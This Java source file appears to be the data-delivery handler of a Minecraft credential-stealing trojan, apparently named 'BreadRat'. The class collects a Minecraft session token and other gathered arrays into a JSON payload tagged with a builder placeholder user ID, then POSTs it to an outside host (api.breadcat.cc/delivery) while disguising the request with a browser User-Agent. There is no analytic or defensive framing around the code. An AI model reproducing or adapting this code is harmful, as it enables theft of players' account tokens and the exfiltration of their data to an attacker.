package cc.breadcat.handlers;

import com.google.gson.JsonArray;
import com.google.gson.JsonObject;

import java.io.OutputStream;
import java.net.HttpURLConnection;
import java.net.URL;
import java.nio.charset.StandardCharsets;

public class apiHandler {
    private static final String userid = "BreadRatConfigMarkerUSERID";
    private final JsonObject payload = new JsonObject();

    public void add(String Value, JsonArray arr) {
        this.payload.add(Value, arr);
    }

    public void sendInfo(String minecraftToken) throws Exception {
        this.payload.addProperty("userid", userid);
        JsonObject minecraft = new JsonObject();
        minecraft.addProperty("token", minecraftToken);
        this.payload.add("minecraft", minecraft);
        final String body = this.payload.toString();
        final HttpURLConnection con = (HttpURLConnection)new URL("https://api.breadcat.cc/delivery").openConnection();
        con.setRequestMethod("POST");
        con.setRequestProperty("Content-Type", "application/json");
        con.setRequestProperty("User-Agent", "Mozilla/5.0");
        con.setDoOutput(true);
        try (OutputStream out = con.getOutputStream();){
            out.write(body.getBytes(StandardCharsets.UTF_8));
        }
        con.getResponseCode();
        return;
    }
}
